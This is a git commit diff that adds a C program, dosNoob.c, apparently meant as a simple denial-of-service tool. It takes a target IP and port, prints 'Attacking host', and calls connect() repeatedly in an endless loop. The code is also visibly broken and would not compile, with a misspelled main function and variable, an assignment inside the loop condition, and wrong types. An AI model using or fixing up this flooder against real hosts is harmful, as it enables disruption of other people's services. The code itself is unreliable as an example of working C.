d0f00fca9bdc9227c5e8b02429533e7320a0d343
Dalmo Veras Neto <verasnt@protonmail.com>
2018-09-04 12:54:30 -0300

    mark 1

--- c-c++/dosNoob.c
+++ c-c++/dosNoob.c
@@ -1,3 +1,19 @@
 #include <stdio.h>
 #include <netdb.h>
-#include <sys/types.h>
+
+int mai(int argc, char *argv[]){
+	struct sockaddr_in target;
+	int conn;
+	int socket = socket(AF_INET, SOCK_STREAM, 0);//ip protocol
+	
+	target.sin_family = AF_INET;
+	terget.sin_port = htons(argv[2]);
+	target.sin_addr.s_addr = inet_addr(argv[1]);
+
+//	conn = connect(socket, (struct socketaddr *)&target, sizeof target);
+	printf("Attacking host %s on port %s \n", argv[1], argv[2]);
+	while(1 = 1){
+		conn = connect(socket, (struct socketaddr *)&target, sizeof target);		
+	}
+
+}
